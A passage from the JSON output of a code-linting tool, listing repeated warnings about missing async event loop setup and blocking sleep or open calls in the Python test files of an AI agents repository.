        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_parallel_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487542"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_sequential_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487567"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_collaborative_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487592"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_consensus_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487616"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_task_decomposition may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487642"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_hierarchical_delegation_execution may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487667"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_swarm_creation_and_optimization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487693"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_swarm_convergence may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487716"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_blackboard_read_write may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487742"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_blackboard_subscriptions may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487766"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_blackboard_pattern_querying may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487789"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_message_pattern_analysis may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487815"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_specialization_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487838"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_full_emergent_behavior_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487862"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_concurrent_task_processing may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487888"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_large_swarm_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487912"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_memory_usage_with_many_agents may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487936"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_agent_failure_handling may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487961"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_partial_parallel_execution_failure may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.487984"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_blackboard_resilience may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.488008"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_customer_support_agent may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.488033"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_data_analyst_agent may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.488056"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function test_orchestrator_metrics_collection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.488092"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.488584"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.488895"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.489144"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.489172"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Async function execute may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.489228"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.490761"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_utils_comprehensive.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.497407"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_utils_comprehensive.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.498953"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_utils_comprehensive.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.500215"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_utils_comprehensive.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.500601"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.506977"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.507054"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.508198"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Async function benchmark_causal_inference_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.519152"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Async function benchmark_working_memory_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.519199"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Async function benchmark_temporal_reasoning_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.519234"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Async function benchmark_integrated_reasoning_concurrency may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.519269"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Async function test_full_benchmark_suite may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.519319"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Async function test_performance_targets may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.519354"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Async function execute_query may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.520021"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.521799"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.521905"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function causal_engine may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.534362"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function working_memory may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.534414"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function tree_of_thoughts may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.534457"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function temporal_engine may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.534497"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function integrated_controller may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.534540"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function performance_optimizer may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.534584"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_causal_discovery_basic may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.534874"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_causal_discovery_ensemble may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.534915"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_intervention_analysis may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.534953"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_counterfactual_analysis may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.534990"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_accuracy_target may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535027"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_memory_storage_and_retrieval may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535065"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_memory_consolidation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535103"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_coherence_tracking may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535141"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_token_limit_compliance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535179"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_hierarchical_organization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535216"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_basic_reasoning may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535255"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_adaptive_search_strategy may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535291"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_quality_scoring may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535328"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_working_memory_integration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535365"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_parallel_exploration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535407"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_pattern_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535446"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_anomaly_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535500"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_multi_horizon_prediction may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535540"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_causal_temporal_analysis may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535579"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_temporal_state_management may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535617"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_reasoning_mode_selection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535655"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_multi_system_coordination may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535692"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_session_management may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535730"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_performance_targets may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535766"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_concurrent_reasoning_sessions may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535804"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_cache_optimization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535841"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_resource_monitoring may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535878"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_adaptive_optimization may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535916"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_performance_bottleneck_detection may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535953"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_end_to_end_reasoning_workflow may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.535993"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_system_resilience may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.536030"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_scalability_under_load may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.536067"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_memory_and_learning_integration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.536104"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_causal_discovery_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.536142"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_memory_system_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.536180"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Async function test_temporal_analysis_performance may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.536218"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.539129"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.541677"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Async function test_full_validation_suite may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.548986"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Async function run_causal_validation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.549190"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Async function run_temporal_validation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.549233"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Async function run_reasoning_validation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.549301"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Async function run_integration_validation may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:46.549347"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.551860"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.570916"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.573460"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.574153"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:46.574169"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.575760"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.575772"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.575793"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.576262"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.576299"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.576342"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.576509"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.576635"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.576742"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:46.576936"
      },
      {
        "category": "ASYNC_PATTERN",
